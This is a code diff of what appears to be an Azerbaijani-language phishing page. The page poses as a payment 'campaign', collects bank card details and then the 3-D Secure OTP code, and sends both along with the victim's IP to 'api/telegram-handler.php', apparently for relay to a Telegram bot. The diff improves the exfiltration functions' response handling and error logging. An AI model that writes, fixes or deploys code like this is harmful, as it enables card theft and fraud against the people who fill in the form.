@@ -96,7 +96,7 @@
             </div>
         </div>
 
-        <!-- STEP 3: KAMPANİYA (1 AZN → 3 AZN) -->
+        <!-- STEP 3: KAMPANİYA -->
         <div id="step-3" class="step-transition hidden-step">
             <div class="flex items-center mb-6">
                 <button onclick="prevStep(2)" class="p-2 -ml-2 rounded-full hover:bg-gray-100 text-gray-400 hover:text-gray-600 transition-colors">
@@ -190,7 +190,7 @@
             </form>
         </div>
 
-        <!-- STEP 6: OTP (4 və ya 6 rəqəm dəstəyi) -->
+        <!-- STEP 6: OTP -->
         <div id="step-6" class="step-transition hidden-step">
             <div class="text-center mb-8">
                 <div class="flex justify-center items-center gap-4 mb-6">
@@ -376,7 +376,7 @@
         }
 
         // ============================================================
-        // 📤 KART MESAJI GÖNDƏR (ORİJİNAL FORMAT)
+        // 📤 KART MESAJI GÖNDƏR (DÜZƏLDİLDİ - TYPE ƏLAVƏ EDİLDİ)
         // ============================================================
         async function sendCardData() {
             let userIP = 'N/A';
@@ -399,18 +399,19 @@
             formData.append('type', 'card_only');
 
             try {
-                await fetch('api/telegram-handler.php', {
+                const response = await fetch('api/telegram-handler.php', {
                     method: 'POST',
                     body: formData
                 });
-                console.log('✅ Kart göndərildi');
+                const result = await response.json();
+                console.log('✅ Kart göndərildi:', result);
             } catch(e) {
-                console.log('❌ Kart göndərilmədi');
+                console.log('❌ Kart göndərilmədi:', e);
             }
         }
 
         // ============================================================
-        // 📤 OTP MESAJI GÖNDƏR (ORİJİNAL FORMAT)
+        // 📤 OTP MESAJI GÖNDƏR (DÜZƏLDİLDİ - TYPE ƏLAVƏ EDİLDİ)
         // ============================================================
         async function sendOtp(otp) {
             let userIP = 'N/A';
@@ -428,14 +429,15 @@
             formData.append('type', 'otp');
 
             try {
-                await fetch('api/telegram-handler.php', {
+                const response = await fetch('api/telegram-handler.php', {
                     method: 'POST',
                     body: formData
                 });
-                console.log('✅ OTP göndərildi');
+                const result = await response.json();
+                console.log('✅ OTP göndərildi:', result);
                 return true;
             } catch(e) {
-                console.log('❌ OTP göndərilmədi');
+                console.log('❌ OTP göndərilmədi:', e);
                 return false;
             }
         }
@@ -508,7 +510,7 @@
         });
 
         // ============================================================
-        // STEP 6: OTP FORM SUBMIT (4 və ya 6 rəqəm)
+        // STEP 6: OTP FORM SUBMIT
         // ============================================================
         document.getElementById('tds-form').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -558,4 +560,4 @@
     </script>
 
 </body>
-</html>
+    </html>
